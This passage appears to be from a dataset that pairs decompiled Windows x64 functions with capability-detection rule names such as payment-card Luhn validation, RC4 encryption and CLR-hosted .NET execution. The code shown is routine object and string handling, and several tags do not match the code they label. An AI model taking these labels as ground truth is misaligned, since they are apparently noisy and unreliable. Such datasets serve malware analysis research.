        "decompiled_code": "\nvoid fcn.140087d40(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uchar uVar5;\n    uint uVar6;\n    int64_t iVar7;\n    uchar uStack65;\n    int64_t aiStack64 [2];\n    \n    uVar5 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x21) = uVar5;\n    uVar5 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x22) = uVar5;\n    uVar6 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x6f) = 1;\n    *(arg3 + 0x58) = uVar6;\n    iVar4 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    (**(iVar4 + 0x20))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400bc6e0(iVar4 + 1);\n    fcn.140024ea0(aiStack64, iVar7, iVar4, 0);\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x18) = iVar4;\n    piVar1 = *0x14010fc90;\n    *(arg3 + 0x10) = iVar7;\n    if (*piVar1 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x28))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400bc6e0(iVar4 + 1);\n    fcn.140024ea0(aiStack64, iVar7, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x28) = iVar7;\n    *(arg3 + 0x30) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x30))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400bc6e0(iVar4 + 1);\n    fcn.140024ea0(aiStack64, iVar7, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x38) = iVar7;\n    *(arg3 + 0x40) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x38))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400bc6e0(iVar4 + 1);\n    fcn.140024ea0(aiStack64, iVar7, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x48) = iVar7;\n    *(arg3 + 0x50) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack64[0] + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(aiStack64[0] + -0x18, &uStack65);\n    }\n    uVar6 = (**(*arg2 + 0x48))(arg2);\n    *(arg3 + 0x5c) = uVar6;\n    uVar6 = (**(*arg2 + 0x50))(arg2);\n    *(arg3 + 0x60) = uVar6;\n    return;\n}\n",
        "token_count": 1368
    },
    "14008821": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid fcn.140088210(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uchar uVar5;\n    uint uVar6;\n    int64_t iVar7;\n    uchar uStack65;\n    int64_t aiStack64 [2];\n    \n    uVar5 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x21) = uVar5;\n    uVar5 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x22) = uVar5;\n    uVar6 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x6f) = 1;\n    *(arg3 + 0x58) = uVar6;\n    iVar4 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    (**(iVar4 + 0x20))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400bc6e0(iVar4 + 1);\n    fcn.140024ea0(aiStack64, iVar7, iVar4, 0);\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x18) = iVar4;\n    piVar1 = *0x14010fc90;\n    *(arg3 + 0x10) = iVar7;\n    if (*piVar1 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x28))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400bc6e0(iVar4 + 1);\n    fcn.140024ea0(aiStack64, iVar7, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x28) = iVar7;\n    *(arg3 + 0x30) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x30))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400bc6e0(iVar4 + 1);\n    fcn.140024ea0(aiStack64, iVar7, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x38) = iVar7;\n    *(arg3 + 0x40) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x38))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400bc6e0(iVar4 + 1);\n    fcn.140024ea0(aiStack64, iVar7, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x48) = iVar7;\n    *(arg3 + 0x50) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack64[0] + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(aiStack64[0] + -0x18, &uStack65);\n    }\n    uVar6 = (**(*arg2 + 0x48))(arg2);\n    *(arg3 + 0x5c) = uVar6;\n    uVar6 = (**(*arg2 + 0x50))(arg2);\n    *(arg3 + 0x60) = uVar6;\n    return;\n}\n",
        "token_count": 1367
    },
    "14008935": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140089350(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = (**(**(arg1 + 0xa0) + 0x30))();\n    if (cVar1 != '\\0') {\n        return *(arg1 + 0x10) - *(arg1 + 0x18);\n    }\n    iVar2 = (**(**(arg1 + 0xa0) + 0x38))\n                      (*(arg1 + 0xa0), arg2, *(arg1 + 0xa8), *(arg1 + 0xb8), *(arg1 + 0x10) - *(arg1 + 8));\n    return (iVar2 + *(arg1 + 0xa8)) - *(arg1 + 0xc0);\n}\n",
        "token_count": 187
    },
    "14008a35": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.14008a350(int64_t *arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    char cVar2;\n    int64_t iVar3;\n    uint in_stack_00000028;\n    \n    *arg1 = -1;\n    *(arg1 + 1) = 0;\n    cVar2 = fcn.140089460(arg2);\n    if (cVar2 != '\\0') {\n        iVar3 = fcn.140082140(arg2 + 0x50, arg3, arg4);\n        if (iVar3 != -1) {\n            uVar1 = *(arg2 + 0xa8);\n            *arg1 = iVar3;\n            *(arg2 + 0x81) = 0;\n            *(arg2 + 0x30) = 0;\n            *(arg2 + 0xb8) = uVar1;\n            *(arg2 + 0xc0) = uVar1;\n            uVar1 = *(arg2 + 0x70);\n            *(arg2 + 0x68) = in_stack_00000028;\n            *(arg2 + 0x18) = uVar1;\n            *(arg1 + 1) = in_stack_00000028;\n            *(arg2 + 8) = uVar1;\n            *(arg2 + 0x10) = uVar1;\n            *(arg2 + 0x20) = 0x0;\n            return arg1;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 344
    },
    "14008b0a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.14008b0a0(ulong *arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uchar uVar2;\n    ushort uVar3;\n    ulong uVar4;\n    ulong uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    \n    fcn.14009bc00(arg1, arg2);\n    *(arg1 + 8) = 0;\n    uVar4 = *(arg2 + 0x70);\n    *arg1 = 0x140117c90;\n    uVar5 = *(arg2 + 0x50);\n    arg1[9] = 0;\n    arg1[10] = uVar5;\n    *(arg2 + 0x50) = 0;\n    *(arg1 + 0xb) = *(arg2 + 0x58);\n    *(arg2 + 0x58) = 0;\n    uVar6 = *(arg2 + 0x60);\n    uVar7 = *(arg2 + 100);\n    uVar8 = *(arg2 + 0x68);\n    uVar9 = *(arg2 + 0x6c);\n    arg1[0xf] = *(arg2 + 0x78);\n    uVar3 = *(arg2 + 0x80);\n    arg1[0xe] = uVar4;\n    *(arg1 + 0x10) = uVar3;\n    *(arg2 + 0x60) = 0;\n    uVar1 = *(arg2 + 0x60);\n    *(arg1 + 0x82) = *(arg2 + 0x82);\n    uVar2 = *(arg2 + 0x83);\n    *(arg1 + 0xc) = uVar6;\n    *(arg1 + 100) = uVar7;\n    *(arg1 + 0xd) = uVar8;\n    *(arg1 + 0x6c) = uVar9;\n    *(arg1 + 0x83) = uVar2;\n    *(arg2 + 0x70) = 0;\n    arg1[0x11] = *(arg2 + 0x88);\n    uVar4 = *(arg2 + 0x90);\n    *(arg2 + 0x78) = 1;\n    *(arg2 + 0x80) = 0;\n    *(arg2 + 0x82) = 0;\n    *(arg2 + 0x88) = 0;\n    *(arg2 + 0x90) = 0;\n    arg1[0x12] = uVar4;\n    *(arg2 + 8) = 0x0;\n    *(arg1 + 0x13) = *(arg2 + 0x98);\n    *(arg2 + 0x98) = 0;\n    arg1[0x14] = *(arg2 + 0xa0);\n    *(arg2 + 0x18) = 0x0;\n    arg1[0x15] = *(arg2 + 0xa8);\n    *(arg2 + 0xa8) = 0;\n    arg1[0x16] = *(arg2 + 0xb0);\n    *(arg2 + 0xb0) = 0;\n    arg1[0x17] = *(arg2 + 0xb8);\n    uVar4 = *(arg2 + 0xc0);\n    *(arg2 + 0xb8) = 0;\n    *(arg2 + 0xc0) = 0;\n    arg1[0x18] = uVar4;\n    *(arg2 + 0x28) = 0x0;\n    *(arg2 + 0x68) = uVar1 & 0xffffffff00000000 | uVar1 >> 0x20;\n    return;\n}\n",
        "token_count": 862
    },
    "14008b68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14008b680(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t *arg1_00;\n    \n    *arg1 = 0x140117c90;\n    fcn.140089c20(arg1);\n    fcn.1400823d0(arg1 + 10);\n    *arg1 = *0x140110550 + 0x10;\n    arg1_00 = arg1[7];\n    if (arg1_00 != *0x140108760) {\n        if (**0x14010fc90 == 0) {\n            iVar1 = *arg1_00;\n            *arg1_00 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *arg1_00;\n            *arg1_00 = *arg1_00 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.1400a5480(arg1_00);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1_00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "14008b6d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14008b6d0(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t *arg1_00;\n    \n    *arg1 = 0x140117c90;\n    fcn.140089c20(arg1);\n    fcn.1400823d0(arg1 + 10);\n    *arg1 = *0x140110550 + 0x10;\n    arg1_00 = arg1[7];\n    if (arg1_00 != *0x140108760) {\n        if (**0x14010fc90 == 0) {\n            iVar1 = *arg1_00;\n            *arg1_00 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *arg1_00;\n            *arg1_00 = *arg1_00 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.1400a5480(arg1_00);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1_00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "14008b72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint64_t fcn.14008b720(int64_t arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uchar uVar2;\n    ulong uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    \n    fcn.140089c20(arg1);\n    fcn.14009bd10(arg1, arg2);\n    uVar3 = *(arg1 + 0x50);\n    *(arg1 + 0x50) = *(arg2 + 0x50);\n    *(arg2 + 0x50) = uVar3;\n    uVar2 = *(arg1 + 0x58);\n    *(arg1 + 0x58) = *(arg2 + 0x58);\n    uVar4 = *(arg2 + 0x60);\n    uVar5 = *(arg2 + 100);\n    uVar6 = *(arg2 + 0x68);\n    uVar7 = *(arg2 + 0x6c);\n    *(arg2 + 0x58) = uVar2;\n    *(arg2 + 0x60) = 0;\n    uVar1 = *(arg2 + 0x60);\n    *(arg1 + 0x60) = uVar4;\n    *(arg1 + 100) = uVar5;\n    *(arg1 + 0x68) = uVar6;\n    *(arg1 + 0x6c) = uVar7;\n    uVar3 = *(arg2 + 0x70);\n    *(arg2 + 0x70) = 0;\n    *(arg1 + 0x70) = uVar3;\n    uVar3 = *(arg2 + 0x78);\n    *(arg2 + 0x78) = 1;\n    *(arg1 + 0x78) = uVar3;\n    uVar2 = *(arg2 + 0x80);\n    *(arg2 + 0x80) = 0;\n    *(arg1 + 0x80) = uVar2;\n    uVar3 = *(arg2 + 0xa8);\n    *(arg2 + 0xa8) = 0;\n    *(arg1 + 0xa8) = uVar3;\n    uVar3 = *(arg2 + 0xb0);\n    *(arg2 + 0xb0) = 0;\n    *(arg1 + 0xb0) = uVar3;\n    uVar3 = *(arg2 + 0xb8);\n    *(arg2 + 0xb8) = 0;\n    *(arg1 + 0xb8) = uVar3;\n    uVar3 = *(arg2 + 0xc0);\n    *(arg2 + 0xc0) = 0;\n    *(arg1 + 0xc0) = uVar3;\n    uVar2 = *(arg2 + 0x81);\n    *(arg2 + 0x81) = 0;\n    *(arg1 + 0x81) = uVar2;\n    uVar2 = *(arg2 + 0x82);\n    *(arg2 + 0x82) = 0;\n    *(arg1 + 0x82) = uVar2;\n    uVar3 = *(arg2 + 0x88);\n    *(arg2 + 0x88) = 0;\n    *(arg1 + 0x88) = uVar3;\n    uVar3 = *(arg2 + 0x90);\n    *(arg2 + 0x90) = 0;\n    *(arg1 + 0x90) = uVar3;\n    uVar2 = *(arg2 + 0x98);\n    *(arg2 + 0x98) = 0;\n    *(arg1 + 0x98) = uVar2;\n    uVar3 = *(arg2 + 0x70);\n    *(arg2 + 0x30) = 0;\n    *(arg2 + 0x18) = uVar3;\n    *(arg2 + 0x68) = uVar1 & 0xffffffff00000000 | uVar1 >> 0x20;\n    *(arg2 + 8) = uVar3;\n    *(arg2 + 0x10) = uVar3;\n    *(arg2 + 0x20) = 0x0;\n    return arg1;\n}\n",
        "token_count": 974
    },
    "14008b92": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.14008b920(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = (**(**(arg1 + 0xa0) + 0x30))();\n    if (cVar1 != '\\0') {\n        return *(arg1 + 0x10) - *(arg1 + 0x18) >> 1;\n    }\n    iVar2 = (**(**(arg1 + 0xa0) + 0x38))\n                      (*(arg1 + 0xa0), arg2, *(arg1 + 0xa8), *(arg1 + 0xb8), *(arg1 + 0x10) - *(arg1 + 8) >> 1);\n    return (iVar2 + *(arg1 + 0xa8)) - *(arg1 + 0xc0);\n}\n",
        "token_count": 196
    },
    "14008c95": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.14008c950(int64_t *arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    char cVar2;\n    int64_t iVar3;\n    uint in_stack_00000028;\n    \n    *arg1 = -1;\n    *(arg1 + 1) = 0;\n    cVar2 = fcn.14008ba30(arg2);\n    if (cVar2 != '\\0') {\n        iVar3 = fcn.140082140(arg2 + 0x50, arg3, arg4);\n        if (iVar3 != -1) {\n            uVar1 = *(arg2 + 0xa8);\n            *arg1 = iVar3;\n            *(arg2 + 0x81) = 0;\n            *(arg2 + 0x30) = 0;\n            *(arg2 + 0xb8) = uVar1;\n            *(arg2 + 0xc0) = uVar1;\n            uVar1 = *(arg2 + 0x70);\n            *(arg2 + 0x68) = in_stack_00000028;\n            *(arg2 + 0x18) = uVar1;\n            *(arg1 + 1) = in_stack_00000028;\n            *(arg2 + 8) = uVar1;\n            *(arg2 + 0x10) = uVar1;\n            *(arg2 + 0x20) = 0x0;\n            return arg1;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 345
    },
    "14008d71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.14008d710(ulong *arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    ushort uVar2;\n    ulong uVar3;\n    ulong uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    \n    fcn.14009c670(arg1, arg2);\n    *(arg1 + 8) = 0;\n    uVar3 = *(arg2 + 0x70);\n    *arg1 = 0x140117d10;\n    uVar4 = *(arg2 + 0x50);\n    arg1[9] = 0;\n    arg1[10] = uVar4;\n    *(arg2 + 0x50) = 0;\n    *(arg1 + 0xb) = *(arg2 + 0x58);\n    *(arg2 + 0x58) = 0;\n    uVar5 = *(arg2 + 0x60);\n    uVar6 = *(arg2 + 100);\n    uVar7 = *(arg2 + 0x68);\n    uVar8 = *(arg2 + 0x6c);\n    arg1[0xf] = *(arg2 + 0x78);\n    uVar2 = *(arg2 + 0x80);\n    arg1[0xe] = uVar3;\n    *(arg1 + 0x10) = uVar2;\n    *(arg2 + 0x60) = 0;\n    uVar1 = *(arg2 + 0x60);\n    *(arg1 + 0x82) = *(arg2 + 0x82);\n    uVar2 = *(arg2 + 0x84);\n    *(arg1 + 0xc) = uVar5;\n    *(arg1 + 100) = uVar6;\n    *(arg1 + 0xd) = uVar7;\n    *(arg1 + 0x6c) = uVar8;\n    *(arg1 + 0x84) = uVar2;\n    *(arg2 + 0x70) = 0;\n    arg1[0x11] = *(arg2 + 0x88);\n    uVar3 = *(arg2 + 0x90);\n    *(arg2 + 0x78) = 1;\n    *(arg2 + 0x80) = 0;\n    *(arg2 + 0x82) = 0;\n    *(arg2 + 0x88) = 0;\n    *(arg2 + 0x90) = 0;\n    arg1[0x12] = uVar3;\n    *(arg2 + 8) = 0x0;\n    *(arg1 + 0x13) = *(arg2 + 0x98);\n    *(arg2 + 0x98) = 0;\n    arg1[0x14] = *(arg2 + 0xa0);\n    *(arg2 + 0x18) = 0x0;\n    arg1[0x15] = *(arg2 + 0xa8);\n    *(arg2 + 0xa8) = 0;\n    arg1[0x16] = *(arg2 + 0xb0);\n    *(arg2 + 0xb0) = 0;\n    arg1[0x17] = *(arg2 + 0xb8);\n    uVar3 = *(arg2 + 0xc0);\n    *(arg2 + 0xb8) = 0;\n    *(arg2 + 0xc0) = 0;\n    arg1[0x18] = uVar3;\n    *(arg2 + 0x28) = 0x0;\n    *(arg2 + 0x68) = uVar1 & 0xffffffff00000000 | uVar1 >> 0x20;\n    return;\n}\n",
        "token_count": 854
    },
    "14008dd1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14008dd10(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t *arg1_00;\n    \n    *arg1 = 0x140117d10;\n    fcn.14008c240(arg1);\n    fcn.1400823d0(arg1 + 10);\n    *arg1 = *0x140110560 + 0x10;\n    arg1_00 = arg1[7];\n    if (arg1_00 != *0x140108760) {\n        if (**0x14010fc90 == 0) {\n            iVar1 = *arg1_00;\n            *arg1_00 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *arg1_00;\n            *arg1_00 = *arg1_00 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.1400a5480(arg1_00);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1_00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "14008dd6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14008dd60(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int32_t *arg1_00;\n    \n    *arg1 = 0x140117d10;\n    fcn.14008c240(arg1);\n    fcn.1400823d0(arg1 + 10);\n    *arg1 = *0x140110560 + 0x10;\n    arg1_00 = arg1[7];\n    if (arg1_00 != *0x140108760) {\n        if (**0x14010fc90 == 0) {\n            iVar1 = *arg1_00;\n            *arg1_00 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *arg1_00;\n            *arg1_00 = *arg1_00 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.1400a5480(arg1_00);\n    // WARNING: Could not recover jumptable at 0x00014001e510. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1_00);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "14008ddb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint64_t fcn.14008ddb0(int64_t arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uchar uVar2;\n    ulong uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    \n    fcn.14008c240(arg1);\n    fcn.14009c780(arg1, arg2);\n    uVar3 = *(arg1 + 0x50);\n    *(arg1 + 0x50) = *(arg2 + 0x50);\n    *(arg2 + 0x50) = uVar3;\n    uVar2 = *(arg1 + 0x58);\n    *(arg1 + 0x58) = *(arg2 + 0x58);\n    uVar4 = *(arg2 + 0x60);\n    uVar5 = *(arg2 + 100);\n    uVar6 = *(arg2 + 0x68);\n    uVar7 = *(arg2 + 0x6c);\n    *(arg2 + 0x58) = uVar2;\n    *(arg2 + 0x60) = 0;\n    uVar1 = *(arg2 + 0x60);\n    *(arg1 + 0x60) = uVar4;\n    *(arg1 + 100) = uVar5;\n    *(arg1 + 0x68) = uVar6;\n    *(arg1 + 0x6c) = uVar7;\n    uVar3 = *(arg2 + 0x70);\n    *(arg2 + 0x70) = 0;\n    *(arg1 + 0x70) = uVar3;\n    uVar3 = *(arg2 + 0x78);\n    *(arg2 + 0x78) = 1;\n    *(arg1 + 0x78) = uVar3;\n    uVar2 = *(arg2 + 0x80);\n    *(arg2 + 0x80) = 0;\n    *(arg1 + 0x80) = uVar2;\n    uVar3 = *(arg2 + 0xa8);\n    *(arg2 + 0xa8) = 0;\n    *(arg1 + 0xa8) = uVar3;\n    uVar3 = *(arg2 + 0xb0);\n    *(arg2 + 0xb0) = 0;\n    *(arg1 + 0xb0) = uVar3;\n    uVar3 = *(arg2 + 0xb8);\n    *(arg2 + 0xb8) = 0;\n    *(arg1 + 0xb8) = uVar3;\n    uVar3 = *(arg2 + 0xc0);\n    *(arg2 + 0xc0) = 0;\n    *(arg1 + 0xc0) = uVar3;\n    uVar2 = *(arg2 + 0x81);\n    *(arg2 + 0x81) = 0;\n    *(arg1 + 0x81) = uVar2;\n    uVar2 = *(arg2 + 0x82);\n    *(arg2 + 0x82) = 0;\n    *(arg1 + 0x82) = uVar2;\n    uVar3 = *(arg2 + 0x88);\n    *(arg2 + 0x88) = 0;\n    *(arg1 + 0x88) = uVar3;\n    uVar3 = *(arg2 + 0x90);\n    *(arg2 + 0x90) = 0;\n    *(arg1 + 0x90) = uVar3;\n    uVar2 = *(arg2 + 0x98);\n    *(arg2 + 0x98) = 0;\n    *(arg1 + 0x98) = uVar2;\n    uVar3 = *(arg2 + 0x70);\n    *(arg2 + 0x30) = 0;\n    *(arg2 + 0x18) = uVar3;\n    *(arg2 + 0x68) = uVar1 & 0xffffffff00000000 | uVar1 >> 0x20;\n    *(arg2 + 8) = uVar3;\n    *(arg2 + 0x10) = uVar3;\n    *(arg2 + 0x20) = 0x0;\n    return arg1;\n}\n",
        "token_count": 974
    },
    "1400b52b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b52b0(int64_t arg1, int64_t arg2)\n\n{\n    fcn.1400b32c0(arg1);\n    fcn.1400b51a0(arg1, arg1 + 0xd0);\n    *(arg1 + 0xe2) = 0;\n    *(arg1 + 0xe0) = 0;\n    *(arg1 + 0x1c) = 0;\n    *(arg1 + 0xd8) = 0;\n    *(arg1 + 0xe8) = arg2;\n    *(arg1 + 0x20) = arg2 == 0;\n    return;\n}\n",
        "token_count": 150
    },
    "140095b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
